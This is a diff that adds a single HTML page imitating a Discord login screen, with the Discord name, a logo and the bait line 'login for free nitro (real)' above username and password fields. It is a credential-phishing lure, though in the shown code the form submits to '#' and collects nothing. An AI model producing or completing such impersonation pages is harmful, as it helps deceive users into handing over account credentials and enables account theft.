@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <!-- Custom CSS -->
+    <style>
+        body {
+            background-color: #4e60d2;
+            color: white;
+        }
+        .login-container {
+            margin-top: 50px;
+        }
+        .login-form {
+            background-color: #424246;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-control {
+            border-radius: 5px;
+        }
+        .btn-login {
+            border-radius: 5px;
+        }
+        .discord-title {
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 15px;
+        }
+        .discord-img {
+            width: 100px; /* Adjust image size */
+            margin-bottom: 15px; /* Adjust margin to bring closer to the form */
+        }
+        /* Custom color for the button */
+        .custom-btn {
+            background-color: #495ddc;
+            border-color: #495ddc;
+        }
+        .custom-btn:hover {
+            background-color: #5a6ff5;
+            border-color: #5a6ff5;
+        }
+    </style>
+
+    <link rel="icon" href="https://i.imgur.com/LgZUbRq.jpg">
+
+</head>
+<body>
+<div class="container">
+    <div class="row justify-content-center">
+        <div class="col-md-12 text-center">
+            <img src="https://i.imgur.com/LgZUbRq.jpg" alt="Logo" class="discord-img">
+            <h1 class="discord-title">Discord</h1>
+            <p>login for free nitro (real)</p>
+        </div>
+    </div>
+    <div class="row justify-content-center login-container">
+        <div class="col-md-6">
+            <div class="login-form">
+                <form action="#" method="post">
+                    <div class="form-group">
+                        <input type="text" class="form-control" id="username" name="username" placeholder="Username" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary btn-block btn-login custom-btn">Log In</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
